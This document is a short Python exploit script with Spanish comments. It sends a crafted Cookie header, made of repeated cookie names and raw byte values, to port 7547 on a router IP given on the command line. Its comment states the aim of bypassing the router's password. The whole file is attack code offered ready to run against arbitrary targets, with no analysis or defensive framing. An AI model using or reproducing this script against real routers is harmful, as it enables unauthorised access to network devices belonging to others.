#!/usr/bin/env python
import sys
import requests
 
PORT="7547"
 
class exploit:
 
    def run(self, router_ip):
        #Saltando la password
        headers = {"Cookie": "C88605=AAAAAAAA;C107257012=\x08\x0b\x27\x19\x66\x40\xb0\x21;C107257012=\x08\x0b\x27\x19"}  
 
        req = requests.get("http://" + router_ip +":" + PORT + "/",  headers = headers)
        if (req.status_code == 200):
            print("Intentando acceder al puerto:" + PORT)
 
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("IP ")
        exit()
 
    router_ip = sys.argv[1]
    exploit().run(router_ip)
